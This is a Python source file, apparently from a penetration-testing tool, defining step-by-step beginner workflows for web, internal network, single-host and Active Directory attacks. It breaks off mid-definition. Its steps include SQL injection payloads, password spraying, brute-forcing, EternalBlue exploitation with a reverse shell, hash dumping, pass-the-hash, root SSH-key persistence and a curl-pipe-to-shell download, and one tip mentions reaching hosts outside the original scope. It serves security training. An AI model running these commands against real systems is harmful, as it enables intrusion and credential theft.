"""
Guided workflow definitions and the GuidePanel sidebar widget.

Each workflow walks a beginner through a complete pentest methodology
step by step, with exact commands, flag explanations, and specific
indicators to look for in tool output.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from textual.widgets import Static
from spectrenet.theme import CYAN, NAVY, NAVY_LIGHT, GREY, WHITE, WARNING, SUCCESS


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

@dataclass
class WorkflowStep:
    title:    str
    what:     str   # what this step does and WHY — 2-4 sentences, specific
    command:  str   # exact command with <placeholder> markers
    flags:    str   # explanation of each flag used
    look_for: str   # specific strings/patterns to find in output
    tip:      str = ""  # pro-tip or follow-up action


@dataclass
class Workflow:
    id:          str
    name:        str
    description: str
    difficulty:  str   # Beginner / Intermediate / Advanced
    steps:       list[WorkflowStep] = field(default_factory=list)


WORKFLOWS: dict[str, Workflow] = {}


def _reg(w: Workflow) -> Workflow:
    WORKFLOWS[w.id] = w
    return w


# ---------------------------------------------------------------------------
# Workflow 1 — External Web Application Pentest
# ---------------------------------------------------------------------------

_reg(Workflow(
    id="web",
    name="Web App Pentest",
    difficulty="Beginner",
    description=(
        "Black-box external web application test. "
        "Covers port scan → web vuln scan → directory brute-force → "
        "CVE template scan → SQL injection → reporting."
    ),
    steps=[

        WorkflowStep(
            title="Port & Service Scan",
            what=(
                "Before touching the web app, find every port it listens on. "
                "Many apps expose admin panels, APIs, or staging environments on "
                "non-standard ports (8080, 8443, 3000, 5000) that aren't linked "
                "anywhere. The service version nmap reports tells you exactly which "
                "CVEs apply — Apache 2.4.49 is different from 2.4.50."
            ),
            command="nmap -T4 -sV -sC -p 80,443,8080,8443,8000,3000,5000,9000 <target>",
            flags=(
                "-T4         Aggressive timing (fast, acceptable noise for pentest)\n"
                "-sV         Probe each open port to detect the exact service version\n"
                "-sC         Run nmap's default NSE scripts (http-headers, ssl-cert, etc.)\n"
                "-p <list>   Only scan these ports — the most common web ports"
            ),
            look_for=(
                "Server: Apache/2.x.x or nginx/1.x.x — note the exact version number.\n"
                "X-Powered-By: PHP/7.x — reveals backend language and version.\n"
                "SSL cert Subject Alternative Names — often leak internal hostnames\n"
                "  and staging subdomains (e.g. dev.target.com, internal.target.com).\n"
                "Port 8080/8443 open — likely a second app or admin interface."
            ),
            tip=(
                "Got an SSL cert? The SANs (Subject Alternative Names) are gold. "
                "They list every hostname the cert is valid for, which maps the full "
                "attack surface. Run this against each discovered hostname separately."
            ),
        ),

        WorkflowStep(
            title="Web Vulnerability Scan",
            what=(
                "Nikto checks the server against a database of 7,000+ known issues: "
                "outdated software, dangerous default files, misconfigured headers, "
                "and exposed admin interfaces. It is noisy — it will appear in logs — "
                "but it is fast and catches obvious misconfigs that manual testing misses. "
                "Run it against every IP and hostname found in step 1."
            ),
            command="nikto -h http://<target> -o nikto_results.txt -Format txt",
            flags=(
                "-h <target>  Target host — use full URL if HTTPS: https://<target>\n"
                "-o <file>    Save results to a file for the report\n"
                "-Format txt  Plain text output (also supports xml, csv, htm)\n"
                "-id u:p      Optional: test with credentials if you have them\n"
                "-p <port>    Optional: target non-standard port (-p 8443)"
            ),
            look_for=(
                "OSVDB-XXXX entries — cross-reference the ID at osvdb.org for exploit detail.\n"
                "/phpmyadmin — direct database access, often with default root:root creds.\n"
                "/manager/html — Tomcat manager, deploy WAR shells from here.\n"
                "/.git/ or /.svn/ — exposed source repository, download with git-dumper.\n"
                "config.php.bak, settings.bak, *.old — backup files containing plaintext creds.\n"
                "Missing X-Frame-Options, CSP headers — document for client report."
            ),
            tip=(
                "Any file ending in .bak, .old, .zip, .sql, or .tar.gz found by Nikto "
                "should be downloaded immediately: 'curl -O http://<target>/config.php.bak'. "
                "These almost always contain database credentials or API keys in plaintext."
            ),
        ),

        WorkflowStep(
            title="Directory & File Discovery",
            what=(
                "Web servers host far more files than are linked in the UI. "
                "Gobuster brute-forces URL paths using a wordlist to find hidden admin "
                "panels, backup files, API endpoints, and development artifacts. "
                "The -x flag appends common extensions to every word — so 'admin' "
                "becomes admin, admin.php, admin.bak, admin.zip, etc."
            ),
            command=(
                "gobuster dir "
                "-u http://<target> "
                "-w /usr/share/wordlists/dirb/common.txt "
                "-x php,asp,aspx,jsp,txt,bak,sql,zip,conf,old "
                "-t 50 "
                "-o gobuster_results.txt"
            ),
            flags=(
                "dir           Directory/file brute-force mode\n"
                "-u <url>      Base URL to attack\n"
                "-w <list>     Wordlist — common.txt is fast; use dirbuster/directory-list-2.3-medium.txt for depth\n"
                "-x <exts>     Append each extension to every word in the list\n"
                "-t 50         50 concurrent threads — reduce to 10 if getting rate-limited\n"
                "-o <file>     Save output to file\n"
                "-k            Skip SSL certificate verification (add for HTTPS targets)"
            ),
            look_for=(
                "/admin, /administrator, /wp-admin — admin panels to attack.\n"
                "/backup, /backups, /db, /dump — likely contain database exports.\n"
                "*.sql, *.zip, *.tar.gz — downloadable sensitive archives.\n"
                "/config.php, /settings.php, /db.php — often contain DB credentials.\n"
                "/api, /api/v1, /api/v2 — API endpoints to enumerate further.\n"
                "/phpmyadmin, /pma — database admin interfaces.\n"
                "(301) vs (200): 301 is a redirect — follow it with your browser."
            ),
            tip=(
                "Found /api? Run gobuster again against that path specifically with an "
                "API-focused wordlist: gobuster dir -u http://<target>/api "
                "-w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt. "
                "API endpoints often lack authentication on sensitive actions."
            ),
        ),

        WorkflowStep(
            title="CVE Template Scan",
            what=(
                "Nuclei runs hundreds of YAML templates that check for specific, confirmed "
                "CVEs — things like Apache Log4Shell, Spring4Shell, ProxyLogon, and thousands "
                "more. Unlike Nikto which looks for generic misconfigs, Nuclei sends "
                "exact PoC payloads to confirm exploitability. A [critical] hit from Nuclei "
                "means the target is confirmed vulnerable, not just potentially vulnerable."
            ),
            command=(
                "nuclei -u http://<target> "
                "-t cves/ -t exposures/ -t misconfiguration/ "
                "-severity medium,high,critical "
                "-o nuclei_results.txt"
            ),
            flags=(
                "-u <url>           Target URL\n"
                "-t cves/           CVE-specific detection templates\n"
                "-t exposures/      Exposed files, panels, credentials\n"
                "-t misconfiguration/ Server misconfiguration checks\n"
                "-severity <list>   Only run templates of these severity levels\n"
                "-o <file>          Save results to file\n"
                "-update-templates  Run this first to get the latest templates"
            ),
            look_for=(
                "[critical] hits — highest priority, confirmed RCE or auth bypass.\n"
                "[high] hits — likely exploitable, investigate immediately.\n"
                "CVE-XXXX-XXXXX — look up the CVE number: 'searchsploit <cve>'\n"
                "  to find Metasploit modules or manual exploit code.\n"
                "[exposed] findings — admin panels, .env files, git repos, API keys."
            ),
            tip=(
                "Run Nuclei against every subdomain found in reconnaissance, not just "
                "the main domain. A critical vuln on a forgotten dev subdomain is just "
                "as dangerous as one on the main site, and dev subdomains are often "
                "years behind on patches."
            ),
        ),

        WorkflowStep(
            title="SQL Injection Testing",
            what=(
                "SQL injection lets an attacker manipulate the database behind a web app — "
                "reading all data, writing records, or (if the DB user has FILE privilege) "
                "executing OS commands. SQLMap automates detection and exploitation. "
                "Start with URL parameters. If the app has a login form or search box, "
                "test those too using the --data flag for POST requests."
            ),
            command=(
                'sqlmap -u "http://<target>/page?id=1" '
                "--batch --level=3 --risk=2 --dbs"
            ),
            flags=(
                "-u <url>       Target URL with parameter to test (the ?id=1 part)\n"
                "--batch        Never ask for user input — accept all defaults automatically\n"
                "--level=3      Test intensity 1-5 (3 covers headers and cookies too)\n"
                "--risk=2       Payload aggressiveness 1-3 (2 includes heavier time-based tests)\n"
                "--dbs          After confirming injection, dump the list of databases\n"
                "--data='...'   For POST requests: --data='username=admin&password=test'\n"
                "--method=POST  Force POST method when using --data"
            ),
            look_for=(
                "'Parameter <name> appears to be injectable' — injection confirmed.\n"
                "available databases: [N] — number and names of databases.\n"
                "'OS shell available' — sqlmap got RCE through the DB (rare but critical).\n"
                "If injectable, next command: sqlmap -u <same url> -D <db_name> --tables\n"
                "  then: sqlmap -u <same url> -D <db_name> -T users --dump"
            ),
            tip=(
                "Got a login form to test? Use: "
                "sqlmap -u 'http://<target>/login' "
                "--data='username=admin&password=test' --batch --dbs. "
                "Also try manual auth bypass in the form field: admin'-- "
                "or ' OR 1=1-- to test without sqlmap first."
            ),
        ),

        WorkflowStep(
            title="Capture Findings & Generate Report",
            what=(
                "Before wrapping up, save all discovered credentials to the loot vault "
                "so they appear in the report. Then generate the HTML report which packages "
                "all findings, tool output, loot, scope, and notes into a single file "
                "you can send directly to the client."
            ),
            command="loot add cred <username>:<password>",
            flags=(
                "loot add cred <text>    Add a credential to the vault\n"
                "loot add hash <text>    Add a password hash\n"
                "loot add secret <text>  Add an API key or secret\n"
                "loot                    View everything in the vault\n"
                "report html             Generate the HTML report after saving loot"
            ),
            look_for=(
                "Loot saved — confirms entry was recorded.\n"
                "After running 'report html': 'Report saved to spectrenet_report_*.html'\n"
                "Open the HTML file in a browser to review before sending to the client."
            ),
            tip=(
                "Run 'note <text>' during any step to add context that appears in the report. "
                "For example: 'note Found /admin with default credentials admin:admin on port 8080'. "
                "Notes + loot + tool output together make a complete, professional report."
            ),
        ),
    ],
))


# ---------------------------------------------------------------------------
# Workflow 2 — Internal Network Pentest
# ---------------------------------------------------------------------------

_reg(Workflow(
    id="internal",
    name="Internal Network Pentest",
    difficulty="Beginner",
    description=(
        "Full internal LAN assessment. "
        "Covers subnet discovery → service mapping → SMB enumeration → "
        "credential spraying → brute-force → exploitation → post-exploitation → report."
    ),
    steps=[

        WorkflowStep(
            title="Fast Subnet Port Discovery",
            what=(
                "On an internal network you often have a /16 or /24 to cover. "
                "Nmap alone would take hours. Masscan sends packets at 10,000/sec "
                "and can sweep all 65,535 ports across a /24 in under 2 minutes. "
                "The goal here is just to find which hosts are alive and which ports "
                "are open — you'll do detailed version scanning on the results next."
            ),
            command="masscan 10.0.0.0/24 -p 1-65535 --rate 10000 -oL masscan_results.txt",
            flags=(
                "10.0.0.0/24     Target subnet — change to match your scope\n"
                "-p 1-65535      Scan every single port (full range)\n"
                "--rate 10000    Send 10,000 packets/sec — lower to 1000 on fragile networks\n"
                "-oL <file>      Save output in list format, easy to parse"
            ),
            look_for=(
                "Hosts with port 445 open — Windows SMB, potential EternalBlue target.\n"
                "Hosts with port 22 open — Linux SSH, brute-force candidate.\n"
                "Hosts with port 3389 open — Windows RDP, BlueKeep/credential target.\n"
                "Hosts with 80/443/8080 — web interfaces (routers, printers, apps).\n"
                "Hosts with 1433/3306/5432 — SQL Server/MySQL/PostgreSQL exposed internally."
            ),
            tip=(
                "Adjust the CIDR to match the scope in your rules of engagement. "
                "On a /16 network (65,536 hosts), drop --rate to 5000 and expect 15-20 minutes. "
                "Never run masscan at full rate on production networks — it can cause "
                "switch flooding and drop legitimate traffic."
            ),
        ),

        WorkflowStep(
            title="Service Version & Script Scan",
            what=(
                "Now run nmap against the live hosts masscan found. This gives exact "
                "service versions (OpenSSH 7.4, Apache 2.4.38, Samba 4.9.5) which "
                "map directly to CVEs. The --script flags run SMB vulnerability checks "
                "automatically — if MS17-010 (EternalBlue) is present, nmap will flag it "
                "here without you having to run a separate check."
            ),
            command=(
                "nmap -T4 -sV -sC "
                "--script smb-vuln-ms17-010,smb-vuln-cve2009-3103,smb-security-mode "
                "10.0.0.0/24 --open "
                "-oN nmap_results.txt"
            ),
            flags=(
                "-T4                      Aggressive timing — acceptable on internal networks\n"
                "-sV                      Detect exact service versions\n"
                "-sC                      Run default NSE scripts for each service\n"
                "--script smb-vuln-*      Check SMB hosts for EternalBlue and related CVEs\n"
                "--open                   Only show hosts with at least one open port\n"
                "-oN <file>               Save output in normal (human-readable) format"
            ),
            look_for=(
                "smb-vuln-ms17-010: VULNERABLE — immediate EternalBlue target, skip to step 6.\n"
                "SMB signing disabled — the host is vulnerable to NTLM relay attacks.\n"
                "Old Windows versions: Windows 7, Windows Server 2008/2012 — likely unpatched.\n"
                "vsftpd 2.3.4 — backdoor CVE, instant root shell (see 'guide host' workflow).\n"
                "OpenSSH versions older than 7.4 — vulnerable to username enumeration (CVE-2018-15473)."
            ),
            tip=(
                "Got a list of hosts with port 445? Run: "
                "nmap -p 445 --script smb-vuln-ms17-010 -iL smb_hosts.txt "
                "to check all of them for EternalBlue in one command. "
                "A 'LIKELY VULNERABLE' result from the script is enough to attempt exploitation."
            ),
        ),

        WorkflowStep(
            title="SMB & NetBIOS Enumeration",
            what=(
                "Enum4linux queries SMB and NetBIOS to extract usernames, group "
                "memberships, share names, and the password policy — all without "
                "any credentials. Usernames let you build targeted wordlists. "
                "The password policy tells you how many guesses you can make before "
                "accounts lock out, which determines how aggressive you can be in step 4."
            ),
            command="enum4linux -a <smb_host>",
            flags=(
                "-a         Run all checks (users, groups, shares, OS info, policy)\n"
                "-u <user>  Optional: authenticate with a known username for more detail\n"
                "-p <pass>  Optional: password for authenticated enumeration\n"
                "-v         Verbose mode — shows raw queries being sent"
            ),
            look_for=(
                "user:[administrator] rid:[0x1f4] — username confirmed. Build a users.txt list.\n"
                "Share Enumeration: \\\\host\\ShareName — check each share for accessible files.\n"
                "Password Policy: Minimum password length, Account lockout threshold.\n"
                "  Lockout threshold of 0 = no lockout = safe to brute-force.\n"
                "  Threshold of 5 = max 4 attempts per account per spray round.\n"
                "Domain: CORP — domain name needed for crackmapexec spraying."
            ),
            tip=(
                "Shares named 'NETLOGON', 'SYSVOL', 'Users', 'Finance', 'IT' often "
                "contain Group Policy files with credentials, scripts with hardcoded "
                "passwords, or sensitive documents. List a share with: "
                "smbclient //10.0.0.x/ShareName -N (no password)"
            ),
        ),

        WorkflowStep(
            title="Credential Spraying with CrackMapExec",
            what=(
                "Password spraying tries one password against every user account on "
                "every host. It is the most effective technique on corporate networks "
                "because users pick predictable passwords (Season+Year, Company+Number). "
                "You spray ONE password at a time with a delay between rounds to stay "
                "under the lockout threshold found in step 3. Never spray more passwords "
                "per round than (lockout threshold - 1)."
            ),
            command=(
                "crackmapexec smb 10.0.0.0/24 "
                "-u users.txt -p 'Password2024!' "
                "--continue-on-success"
            ),
            flags=(
                "smb              Protocol to attack (also: ssh, winrm, rdp, ldap, mssql)\n"
                "10.0.0.0/24      Target subnet — CME tests every live host automatically\n"
                "-u users.txt     File with one username per line (built from step 3 output)\n"
                "-p 'Password'    Single password to try — quote it if it has special chars\n"
                "--continue-on-success  Don't stop after first hit — find all valid accounts"
            ),
            look_for=(
                "[+] 10.0.0.x CORP\\jsmith:Password2024! — valid credential found.\n"
                "(Pwn3d!) next to a hit — that user has local admin on that host.\n"
                "Multiple [+] for the same password — the password is reused widely.\n"
                "Passwords to try in order: Password1, Password2024!, Welcome1,\n"
                "  Summer2024!, CompanyName1, CompanyName2024, [Blank] (empty string)."
            ),
            tip=(
                "Got a valid credential? Immediately check: "
                "crackmapexec smb 10.0.0.0/24 -u <user> -p <password> --shares "
                "to list all shares that user can access. Then: "
                "crackmapexec smb 10.0.0.0/24 -u <user> -p <password> --sam "
                "on any (Pwn3d!) host to dump the local SAM database."
            ),
        ),

        WorkflowStep(
            title="Brute-Force SSH / FTP Logins",
            what=(
                "For Linux hosts with SSH or any host with FTP, run Hydra with the "
                "usernames discovered in step 3 and a password list. Use rockyou.txt "
                "for FTP (often has weak passwords). For SSH, start with a smaller "
                "targeted list of common passwords first — rockyou has 14 million "
                "entries and SSH rate-limits aggressively."
            ),
            command=(
                "hydra -L users.txt "
                "-P /usr/share/wordlists/rockyou.txt "
                "ssh://<target> "
                "-t 4 -V -o hydra_ssh_results.txt"
            ),
            flags=(
                "-L users.txt       File with usernames (one per line)\n"
                "-P rockyou.txt     Password list — use full path\n"
                "ssh://<target>     Protocol and target IP\n"
                "-t 4               4 threads — SSH will ban you if you go higher\n"
                "-V                 Verbose — print every attempt (use -v for less noise)\n"
                "-o <file>          Save successful logins to file\n"
                "-s <port>          Non-standard port: -s 2222"
            ),
            look_for=(
                "[22][ssh] host: 10.0.0.x login: deploy password: Deploy2023! — success.\n"
                "After a hit: ssh <user>@<host> to log in, then:\n"
                "  id && sudo -l && cat /etc/passwd && ls /home\n"
                "sudo -l with NOPASSWD entries means instant root:\n"
                "  (ALL) NOPASSWD: /bin/bash → run 'sudo /bin/bash'"
            ),
            tip=(
                "For FTP: replace ssh:// with ftp://. Try blank passwords too: "
                "hydra -l anonymous -p anonymous ftp://<target>. "
                "Many internal FTP servers allow anonymous login and contain sensitive files. "
                "After logging in: 'ls -la' and download everything interesting with 'get'."
            ),
        ),

        WorkflowStep(
            title="Exploitation via Metasploit",
            what=(
                "MS17-010 (EternalBlue) is the most common critical vulnerability on "
                "internal networks — any unpatched Windows 7, 8, 10, Server 2008/2012/2016 "
                "host with SMB port 445 open is likely vulnerable. It gives you a SYSTEM "
                "shell (highest privilege on Windows) without needing credentials. "
                "If nmap flagged any hosts as VULNERABLE in step 2, start here."
            ),
            command="msf use exploit/windows/smb/ms17_010_eternalblue",
            flags=(
                "After entering MSF mode, set these options:\n"
                "set RHOSTS <target_ip>    The vulnerable host IP\n"
                "set LHOST <your_ip>       Your attacking machine IP (the reverse shell connects here)\n"
                "set LPORT 4444            Port to receive the shell on (any unused port works)\n"
                "set PAYLOAD windows/x64/meterpreter/reverse_tcp   Best payload for post-ex\n"
                "check                     Verify the target is vulnerable before firing\n"
                "run                       Launch the exploit"
            ),
            look_for=(
                "[*] Sending stage — payload being delivered.\n"
                "[*] Meterpreter session opened — you have a shell.\n"
                "meterpreter > — you are now in a Meterpreter session.\n"
                "Run immediately after getting a shell:\n"
                "  getuid           → should show NT AUTHORITY\\SYSTEM\n"
                "  hashdump         → dump all local account password hashes\n"
                "  run post/windows/gather/smart_hashdump  → more thorough dump"
            ),
            tip=(
                "Meterpreter 'hashdump' gives you NTLM hashes. These can be:\n"
                "1. Cracked offline: hashcat -m 1000 hashes.txt rockyou.txt\n"
                "2. Used directly for Pass-the-Hash: crackmapexec smb 10.0.0.0/24\n"
                "   -u Administrator -H <ntlm_hash> — no cracking needed."
            ),
        ),

        WorkflowStep(
            title="Save Loot & Report",
            what=(
                "After exploitation, save every credential, hash, and sensitive finding "
                "to the loot vault before the session ends. Tool output disappears when "
                "you close SpectreNet — the loot vault persists. Then generate the HTML "
                "report which packages everything into a deliverable for the client."
            ),
            command="loot add cred <username>:<password>",
            flags=(
                "loot add cred <text>    Credential (user:pass format)\n"
                "loot add hash <text>    NTLM hash or /etc/shadow entry\n"
                "loot add file <text>    Path to a sensitive file you found\n"
                "loot add secret <text>  API key, token, or connection string\n"
                "loot                    Review everything saved\n"
                "report html             Generate the final HTML report"
            ),
            look_for=(
                "Loot entry saved — entry was recorded successfully.\n"
                "Report saved to spectrenet_report_<timestamp>.html — open in browser."
            ),
            tip=(
                "Before generating the report, review it with 'workspace' — this shows "
                "every command run, every note added, and all workspace data in one view. "
                "Add notes for anything important that isn't captured automatically: "
                "'note EternalBlue confirmed on 10.0.0.15 (Windows Server 2008 R2 unpatched)'"
            ),
        ),
    ],
))


# ---------------------------------------------------------------------------
# Workflow 3 — Single Host Full Compromise
# ---------------------------------------------------------------------------

_reg(Workflow(
    id="host",
    name="Single Host Full Compromise",
    difficulty="Beginner",
    description=(
        "Thorough single-target assessment. "
        "Covers full port scan → vulnerability scan → exploit research → "
        "exploitation → post-exploitation → credential harvesting → report."
    ),
    steps=[

        WorkflowStep(
            title="Full Port & Service Scan",
            what=(
                "When targeting a single host, always scan all 65,535 ports. "
                "Services on non-standard ports are frequently forgotten, unmonitored, "
                "and unpatched. A Tomcat manager on port 8009 or a VNC server on 5900 "
                "can be easier to exploit than hardened services on standard ports. "
                "This scan also runs default NSE scripts that grab banners, SSL certs, "
                "HTTP headers, and SMB information automatically."
            ),
            command="scan full <target>",
            flags=(
                "This runs: nmap -T4 -sV -sC -A -p-\n"
                "-A          Enables OS detection, version detection, script scanning, traceroute\n"
                "-p-         Scan all 65,535 TCP ports (takes 5-10 min on a LAN)\n"
                "            For a quicker first pass, use 'scan quick <target>' instead\n"
                "            which runs: nmap -T4 -F (top 100 ports, ~30 seconds)"
            ),
            look_for=(
                "Every open port and the exact version string — these are your attack vectors.\n"
                "OS detection: 'Windows Server 2008', 'Ubuntu 18.04' — determines exploit options.\n"
                "Port 21 vsftpd 2.3.4 — known backdoor (instant root shell).\n"
                "Port 8009 Apache Jserv — Ghostcat vulnerability (read arbitrary files).\n"
                "Port 5985 — WinRM open, test with crackmapexec winrm.\n"
                "Port 6379 — Redis with no auth, often writable to cron for RCE."
            ),
            tip=(
                "While the full scan runs, do a quick manual check of the web service "
                "if port 80/443 is open: browse to http://<target> and look at the "
                "page source. CMS platforms like WordPress, Joomla, or Drupal have "
                "dedicated exploit modules in Metasploit and known default credentials."
            ),
        ),

        WorkflowStep(
            title="Targeted Vulnerability Scan",
            what=(
                "Run nmap's vulnerability scripts against the specific services found "
                "in step 1. These scripts send actual exploit probes — the smb-vuln-ms17-010 "
                "script checks if the host responds to the MS17-010 trigger, and "
                "http-shellshock tests CGI endpoints for Shellshock. Unlike Nikto which "
                "looks for generic issues, these scripts confirm specific CVEs."
            ),
            command=(
                "nmap -T4 --script vuln "
                "-p <discovered_open_ports> <target>"
            ),
            flags=(
                "--script vuln    Run all scripts in the 'vuln' category\n"
                "                 This includes: smb-vuln-ms17-010, http-shellshock,\n"
                "                 ssl-heartbleed, smb-vuln-ms10-054, ftp-vsftpd-backdoor,\n"
                "                 http-sql-injection, and many more\n"
                "-p <ports>       Only target the open ports found in step 1\n"
                "                 Example: -p 22,80,445,8080"
            ),
            look_for=(
                "VULNERABLE: — confirmed vulnerability, note the CVE number.\n"
                "State: VULNERABLE — same as above.\n"
                "IDs: CVE:CVE-XXXX-XXXXX — exact CVE reference for searchsploit.\n"
                "ftp-vsftpd-backdoor: VULNERABLE — instant root via port 6200.\n"
                "ssl-heartbleed: VULNERABLE — SSL private key and memory leakage."
            ),
            tip=(
                "If --script vuln is too noisy, target specific scripts: "
                "nmap --script smb-vuln-ms17-010 -p 445 <target> "
                "or nmap --script http-shellshock -p 80 <target>. "
                "Each script in /usr/share/nmap/scripts/ has comments explaining what it tests."
            ),
        ),

        WorkflowStep(
            title="Research Available Exploits",
            what=(
                "Searchsploit searches the local copy of Exploit-DB — the world's largest "
                "archive of public exploits. Search for the service name and version found "
                "in step 1. 'Metasploit' in the results means there's a ready-to-use MSF "
                "module. 'Remote' in the results means it works over the network "
                "(as opposed to 'Local' which requires existing access)."
            ),
            command="searchsploit <service_name> <version>",
            flags=(
                "Examples:\n"
                "  searchsploit vsftpd 2.3.4\n"
                "  searchsploit apache 2.4.49\n"
                "  searchsploit samba 4.9\n"
                "  searchsploit CVE-2021-41773\n"
                "  searchsploit tomcat manager\n"
                "-m <EDB-ID>       Copy the exploit file to the current directory\n"
                "--nmap <xml>      Search for exploits for all services in an nmap XML output"
            ),
            look_for=(
                "Exploits/Remote — exploitable over the network without prior access.\n"
                "Metasploit in the path — note the MSF module path for step 4.\n"
                "EDB-ID number on the left — use searchsploit -m <id> to copy the exploit.\n"
                "Shellcodes vs Exploits — Shellcodes are payloads, Exploits are the delivery."
            ),
            tip=(
                "If searchsploit returns nothing, the vulnerability may still exist — "
                "the public database doesn't have everything. Also try: 'nuclei -u <target> "
                "-t cves/' to catch CVEs from the last few years that searchsploit may lack. "
                "And check Metasploit directly: inside MSF type 'search <service>'."
            ),
        ),

        WorkflowStep(
            title="Launch the Exploit",
            what=(
                "Load the best Metasploit module from the searchsploit results. "
                "Set the required options: RHOSTS (the target), LHOST (your machine — "
                "where the reverse shell will connect back), and PAYLOAD. "
                "Always run 'check' before 'run' when the module supports it — it "
                "confirms the target is vulnerable without actually exploiting it, "
                "which is important for minimising client impact."
            ),
            command="msf use <module_path>",
            flags=(
                "Example module paths:\n"
                "  exploit/unix/ftp/vsftpd_234_backdoor\n"
                "  exploit/windows/smb/ms17_010_eternalblue\n"
                "  exploit/multi/http/apache_normalize_path_rce\n\n"
                "After loading, always run:\n"
                "  show options    — see all required and optional settings\n"
                "  set RHOSTS <target_ip>\n"
                "  set LHOST <your_ip>\n"
                "  set PAYLOAD <payload>  — use meterpreter payloads for post-ex capability\n"
                "  check           — verify target is vulnerable (when supported)\n"
                "  run             — execute the exploit"
            ),
            look_for=(
                "Session opened — exploit succeeded, you have a shell.\n"
                "meterpreter > — Meterpreter session active, full post-ex available.\n"
                "$ or # prompt — basic shell session (# means root already).\n"
                "If exploit fails: 'show targets' — different target versions may need\n"
                "  a different target setting. Try 'set target 1' then 'run' again."
            ),
            tip=(
                "For vsftpd 2.3.4: the backdoor listens on port 6200 after triggering. "
                "The MSF module handles this automatically. After getting the shell, "
                "run 'id' — vsftpd runs as root so you'll have immediate root access. "
                "Add your SSH key to /root/.ssh/authorized_keys for persistent access."
            ),
        ),

        WorkflowStep(
            title="Post-Exploitation Enumeration",
            what=(
                "You have a shell — now find out everything about where you landed. "
                "Understand what user you are, what OS you're on, whether you can "
                "escalate to root/SYSTEM, what other machines are reachable from here, "
                "and what credentials or sensitive data exist on this host. "
                "This is the 'pivot point' — from here you can often reach systems "
                "that weren't in your original scope."
            ),
            command="postex register <target_host> <platform> <username>",
            flags=(
                "postex register 10.0.0.5 linux www-data   — register a Linux shell\n"
                "postex register 10.0.0.5 windows SYSTEM   — register a Windows shell\n"
                "postex enum <session_id>                   — print enumeration commands\n"
                "postex pivot <session_id>                  — suggest pivot routes\n\n"
                "Key commands to run inside a Linux shell:\n"
                "  id && whoami && hostname && uname -a\n"
                "  sudo -l                     (can we sudo without a password?)\n"
                "  cat /etc/passwd && cat /etc/shadow\n"
                "  find / -perm -4000 2>/dev/null  (SUID binaries for privesc)\n"
                "  ip addr && ip route         (what networks can we reach?)"
            ),
            look_for=(
                "uid=0(root) — already root, proceed to credential harvesting.\n"
                "(ALL) NOPASSWD in sudo -l — run 'sudo /bin/bash' for instant root.\n"
                "SUID binaries: /usr/bin/find, /usr/bin/vim, /usr/bin/python — privesc.\n"
                "New IP ranges in 'ip route' — this host is dual-homed, can pivot there.\n"
                ".ssh/id_rsa files — private SSH keys, try against other hosts."
            ),
            tip=(
                "On Linux, run LinPEAS for automated privilege escalation enumeration: "
                "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh. "
                "On Windows inside Meterpreter: run post/multi/recon/local_exploit_suggester "
                "to list every known local privilege escalation module applicable to this host."
            ),
        ),

        WorkflowStep(
            title="Credential Harvesting",
            what=(
                "A compromised host is a credential goldmine. Hashes from Windows SAM, "
                "plaintext passwords from Linux /etc/shadow (after cracking), SSH private "
                "keys, browser-stored passwords, config files with database credentials, "
                "and environment variables all live here. Every credential you harvest "
                "can be tested for reuse across every other host on the network."
            ),
            command="loot add hash <username>:<ntlm_hash>",
            flags=(
                "Windows (inside Meterpreter):\n"
                "  hashdump                                    — SAM database hashes\n"
                "  run post/windows/gather/smart_hashdump      — more thorough dump\n"
                "  run post/windows/gather/credentials/credential_collector\n"
                "  run post/windows/gather/enum_applications   — installed software\n\n"
                "Linux (inside shell):\n"
                "  cat /etc/shadow                             — shadow file hashes\n"
                "  find / -name '*.conf' 2>/dev/null | xargs grep -l 'password'\n"
                "  cat ~/.bash_history                         — commands + creds in history\n"
                "  find / -name 'id_rsa' 2>/dev/null           — private SSH keys"
            ),
            look_for=(
                "Administrator:500:NTLM_HASH — admin hash, use for pass-the-hash.\n"
                "root:$6$... — Linux shadow hash (SHA-512), crack with hashcat -m 1800.\n"
                "password = 'PlaintextPassword' in a config file — save to loot vault.\n"
                "DB_PASSWORD, API_KEY in .env files or exports in bash history."
            ),
            tip=(
                "NTLM hashes don't need to be cracked to be useful. "
                "Use them directly with: crackmapexec smb 10.0.0.0/24 "
                "-u Administrator -H <ntlm_hash>. "
                "If the hash works on other hosts (pass-the-hash), you've achieved "
                "lateral movement without ever knowing the plaintext password."
            ),
        ),

        WorkflowStep(
            title="Generate Final Report",
            what=(
                "Package everything into a deliverable. The HTML report includes "
                "all tool output, captured loot, scope, notes, and a timeline of "
                "commands run during the engagement. Review it in a browser before "
                "sending — check that all critical findings are documented with "
                "evidence and that remediation steps are clear."
            ),
            command="report html",
            flags=(
                "report          Generate a Markdown report\n"
                "report html     Generate a self-contained HTML report (recommended)\n"
                "                The HTML file includes all styling — no external dependencies\n"
                "loot            Review all saved loot before generating\n"
                "workspace       Review all commands and notes from the session"
            ),
            look_for=(
                "Report saved to spectrenet_report_<timestamp>.html\n"
                "Open in browser: the report should show Findings, Loot, Timeline sections.\n"
                "Each finding should have: description, evidence, severity, remediation."
            ),
            tip=(
                "Add severity context with notes before reporting: "
                "'note CRITICAL: Remote code execution via vsftpd backdoor on 10.0.0.5, "
                "gained root without credentials, host fully compromised'. "
                "Client reports need clear business impact language, not just CVE numbers."
            ),
        ),
    ],
))


# ---------------------------------------------------------------------------
# Workflow 4 — Active Directory Attack Chain
# ---------------------------------------------------------------------------

_reg(Workflow(
    id="ad",
    name="Active Directory Attack Chain",
    difficulty="Intermediate",
    description=(
        "Domain compromise from zero credentials. "
        "Covers DC recon → unauthenticated enumeration → password spraying → "
        "exploitation → domain hash dump → lateral movement planning."
    ),
    steps=[

        WorkflowStep(
            title="Domain Controller Recon",
            what=(
                "Active Directory exposes a distinctive set of ports. Kerberos on 88 "
                "confirms this is a DC. LDAP on 389/636 is the directory service itself. "
                "SMB on 445 is used for replication and file shares. WinRM on 5985 "
                "is PowerShell remoting — if open, a valid credential gives you a "
                "shell immediately. Scan these ports first to understand exactly what "
                "attack surface the DC exposes."
            ),
            command=(
                "nmap -T4 -sV -sC "
                "-p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 "
                "<dc_ip>"
            ),
            flags=(
                "-p 53        DNS — the DC runs internal DNS, leaks domain name in responses\n"
